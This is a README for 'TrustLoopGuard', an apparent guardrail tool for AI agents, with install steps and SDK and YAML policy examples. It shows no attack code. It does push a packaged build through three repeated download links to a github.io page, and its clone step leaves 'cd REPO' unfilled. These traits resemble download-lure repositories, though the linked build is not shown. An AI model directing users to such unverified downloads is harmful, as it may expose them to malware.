# TrustLoopGuard v2026 - AI agent guardrails 2026

> **TrustLoopGuard is a cross-platform guardrail layer for AI agents that evaluates responses and tool calls in real time, helping teams apply policy decisions through SDK, gateway proxy, or MCP server workflows.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-hill91/trustloopguard-sdk-proxy?style=flat-square)](https://github.com/zack-hill91/trustloopguard-sdk-proxy)

---

<p align="center">
  <a href="https://zack-hill91.github.io/trustloopguard-sdk-proxy/">
    <img src="https://img.shields.io/badge/Download-TrustLoopGuard%20Latest-brightgreen?style=for-the-badge" alt="Download TrustLoopGuard">
  </a>
</p>

> **[Direct Download - TrustLoopGuard v2026](https://zack-hill91.github.io/trustloopguard-sdk-proxy/)**

---

[Download Latest Build](https://zack-hill91.github.io/trustloopguard-sdk-proxy/)

---

## What TrustLoopGuard Does

TrustLoopGuard is designed to operate as a control layer between AI agents and the outputs or actions they are about to produce. It reviews responses and tool calls before they move forward, giving teams a policy enforcement point where decisions can allow, block, rewrite, or escalate a request.

It fits projects that need one consistent guardrail boundary across different runtimes and integration styles. You can embed it in application code, place it in a proxy path, or surface its behavior through an MCP server, all while keeping the policy layer compact and focused.

---

## Capabilities

- Review agent responses and tool calls before they continue downstream
- Apply allow, block, rewrite, or escalate outcomes according to policy
- Operate in SDK mode or gateway proxy mode, based on your architecture
- Use a low-latency hot path with parallel tiers for quick evaluation
- Express guardrail rules in YAML
- Integrate with TypeScript, Python, and Rust SDKs
- Provide guardrail workflows through MCP server support
- Work with OpenAPI-friendly interfaces for broader automation

---

## Installation

You can clone the source repository or download the latest build, then pick the integration path that matches your environment.

Clone from source:

```bash
git clone https://github.com/zack-hill91/trustloopguard-sdk-proxy.git
cd REPO
```

Begin with one of the supported entry points:
- SDK integration for app-level enforcement
- Gateway proxy mode for centralized inspection
- MCP server mode for tool-facing workflows

If you use a packaged release, open the downloaded build and follow the launch steps included for your platform.

---

## Using TrustLoopGuard

In a typical setup, TrustLoopGuard is placed in front of model outputs or tool invocations, evaluates the policy outcome, and then passes along the approved result.

Example flow:
1. Receive an agent response or tool call.
2. Send it through the guardrail layer.
3. Apply the returned decision.
4. Deliver, transform, or stop the action based on policy.

Example SDK-style usage pattern:

```ts
import { Guard } from "trustloopguard"

const guard = new Guard({
  policy: "policy.yaml"
})

const result = await guard.inspect({
  content: "agent output or tool call"
})

if (result.decision === "allow") {
  // continue
}
```

You can also place it as a proxy in front of agent traffic or wire it into MCP-based tooling when you want a central policy boundary.

---

## Configuration

Policies are usually written in YAML and then loaded by the runtime or SDK entry point.

Example layout:

```yaml
policy:
  mode: strict
  on_violation: escalate
  tiers:
    - inspect_responses
    - inspect_tool_calls
```

Common configuration areas include:
- Rule definitions
- Decision handling
- Runtime mode selection
- SDK or proxy connection details
- MCP or OpenAPI integration settings

---

## Requirements

- Cross-platform environment
- A supported runtime for your chosen SDK language
- TypeScript, Python, or Rust if you are using one of the language bindings
- YAML support for policy configuration
- Network access when operating through gateway or MCP-based integrations

---

## FAQ

**How do I get updates?**  
Download the latest published build or pull the repository changes before rolling out a new release.

**Can I use this with different deployment styles?**  
Yes. TrustLoopGuard supports SDK usage, gateway proxy mode, and MCP server-based integration patterns.

**Where do I change policy behavior?**  
Edit the YAML policy file or adjust the configuration passed into your SDK or service runtime.

**What if a rule needs more context?**  
Use escalation paths in your policy so a decision can be routed to a higher-level handler.

**Where should I start if something is not working?**  
Check the runtime mode, policy syntax, and integration settings first, then confirm that your agent traffic is reaching the guardrail layer.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
